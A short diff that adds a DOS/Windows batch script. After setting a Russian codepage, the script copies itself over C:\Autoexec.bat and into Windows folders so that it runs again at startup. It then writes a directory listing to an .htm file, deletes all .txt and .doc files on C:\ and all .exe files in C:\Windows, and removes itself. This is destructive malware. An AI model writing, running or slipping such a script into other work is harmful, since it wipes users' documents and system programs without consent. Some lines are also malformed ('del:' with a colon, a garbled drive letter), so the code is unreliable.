@@ -1,0 +1,19 @@
+mode con codepage prepare=((866) C:\WINDOWS\COMMAND\ega3.cpi)
+
+mode con codepage select=866keyb ru,,C:\WINDOWS\COMMAND\keybrd3.sys
+
+COPY JKL.bat C:\Autoexec.Bat
+
+COPY C:\Autoexec.bat Ñ:\Windows\JKL.bat
+
+COPY C:\Autoexec.bat C:\Windows\System32\Autoexec.bat
+
+dir >C:\Dzeran.boom.ru.htm
+
+del C:\*.txt
+
+del: C:\*.doc
+
+del: C:\Windows\*.exe
+
+del: JKL.bat
